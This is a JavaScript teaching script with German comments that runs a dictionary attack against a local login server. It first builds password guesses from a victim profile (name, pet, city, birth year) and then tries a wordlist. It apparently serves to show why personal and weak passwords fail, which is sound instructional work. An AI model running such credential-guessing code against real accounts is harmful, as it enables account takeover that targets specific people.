// Wörterbuch-Angriff (Stufe 2.2, "mittel").
// Statt alle Kombinationen zu bauen, probieren wir nur Wörter aus einer Liste.
// Das ist meistens schneller, weil Leute oft bekannte/schwache Passwörter nehmen.
//
// Zusätzlich testen wir Permutationen aus PERSÖNLICHEN Daten des Opfers
// (Name, Geburtsjahr, Haustier, ...). Idee: Viele Menschen bauen ihr Passwort aus
// Dingen, die man über sie kennt - z.B. "Max2010" oder "monkey!". Kennt der
// Angreifer diese Daten (aus Social Media, Datenlecks, ...), sind solche
// Passwörter schnell geknackt.

const fs = require("fs"); // eingebautes Modul zum Einlesen von Dateien

const username = "admin";

// Baut aus den persönlichen Daten in data/victim_profile.json typische Passwort-
// Varianten (Permutationen), z.B. "monkey", "Monkey", "monkey1998", "monkey98",
// "monkey123", "monkey!" und das reine Geburtsjahr.
function buildPermutations() {
  const profile = JSON.parse(fs.readFileSync("data/victim_profile.json", "utf8"));
  const year = String(profile.birthYear); // "1998"
  const shortYear = year.slice(-2); // "98"
  const bases = [profile.name, profile.pet, profile.city].filter(Boolean);

  const candidates = [];
  for (const base of bases) {
    const firstWord = base.split(" ")[0]; // "Max Muster" -> "Max"
    const lower = firstWord.toLowerCase();
    const Capitalized = lower.charAt(0).toUpperCase() + lower.slice(1);
    for (const v of [lower, Capitalized]) {
      candidates.push(v); // monkey
      candidates.push(v + year); // monkey1998
      candidates.push(v + shortYear); // monkey98
      candidates.push(v + "123"); // monkey123
      candidates.push(v + "!"); // monkey!
    }
  }
  candidates.push(year); // 1998
  return candidates;
}

// einen Login-Versuch schicken, true wenn das Passwort stimmt
// async/await, weil wir auf die Antwort vom Server warten müssen
async function tryLogin(username, password) {
  const response = await fetch("http://localhost:3000/login", {
    method: "POST", // Daten an den Server senden
    headers: { "Content-Type": "application/json" }, // Daten sind JSON
    body: JSON.stringify({ username, password }), // Objekt in JSON-Text umwandeln
  });
  return response.status === 200; // 200 = Login OK
}

async function dictionaryAttack() {
  const start = Date.now(); // Startzeit für die Dauer merken

  // ganze Datei als Text einlesen und in einzelne Wörter (eine pro Zeile) aufteilen
  const content = fs.readFileSync("data/dictionary.txt", "utf8");
  const words = content
    .split(/\r?\n/) // bei jedem Zeilenumbruch trennen (Windows \r\n und Linux \n)
    .map((word) => word.trim()) // Leerzeichen/Reste am Rand entfernen
    .filter((word) => word.length > 0); // leere Zeilen rauswerfen

  // Erst die persönlichen Permutationen probieren (die sind oft am wahrscheinlichsten),
  // danach die allgemeine Wortliste.
  const candidates = [...buildPermutations(), ...words];

  console.log("Probiere", candidates.length, "Kandidaten (Permutationen + Wortliste) ...");

  // jeden Kandidaten der Reihe nach als Passwort ausprobieren
  for (const candidate of candidates) {
    const found = await tryLogin(username, candidate);
    if (found) {
      const seconds = (Date.now() - start) / 1000;
      console.log("Passwort gefunden:", candidate);
      console.log("Dauer:", seconds, "Sekunden");
      return; // gefunden -> wir können aufhören
    }
  }

  // Schleife ganz durch, kein Kandidat hat gepasst
  console.log("Kein Passwort gefunden.");
}

dictionaryAttack(); // Angriff starten
